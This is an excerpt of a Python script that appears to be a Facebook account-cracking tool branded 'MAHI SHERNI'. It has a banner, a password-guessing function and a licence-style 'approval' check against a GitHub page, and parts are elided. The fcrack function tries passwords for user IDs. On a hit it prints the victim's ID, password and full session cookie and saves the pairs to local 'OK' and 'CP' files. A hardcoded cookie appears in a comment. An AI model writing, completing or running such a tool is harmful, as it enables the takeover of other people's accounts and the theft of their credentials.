...
logo = """
         \033[1;37m 
888b     d888        d8888 888    888 8888888 
8888b   d8888       d88888 888    888   888   
88888b.d88888      d88P888 888    888   888   
888Y88888P888     d88P 888 8888888888   888   
888 Y888P 888    d88P  888 888    888   888   
888  Y8P  888   d88P   888 888    888   888   
888      888  d8888888888 888    888   888   
888       888 d88P     888 888    888 8888888 
                                              
                                              
                                              
\033[1;32m SHERNI\033[1;37m 
--------------------------------------------------
[•]CREATED BY     : \033[1;32mMAHI SHERNI\033[1;37m
[•]FACEBOOK       : \033[1;32mTAHIR KI JAAN\033[1;37m
[•]YOUTUBE        : \033[1;32mMAHI TRICKER\033[1;37m
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=7xZVZZw2vMQYc3I_cgQJJKvv; sb=7xZVZbluPD7ulZ2fwzaQyEfk; m_pixel_ratio=2; wd=360x684; fr=09FI3SkMjEsNDBCSU..BlVRbv.kK.AAA.0.0.BlVRdW.AWV8AHUsiAE',
    'dpr': '2',
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MAHISHERNI-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('MAHISHERNI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[MAHISHERNI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('MAHISHERNI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMAHISHERNI\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Tahirkijaan143/Maahi/commits/main').text
    if id in httpCaht:
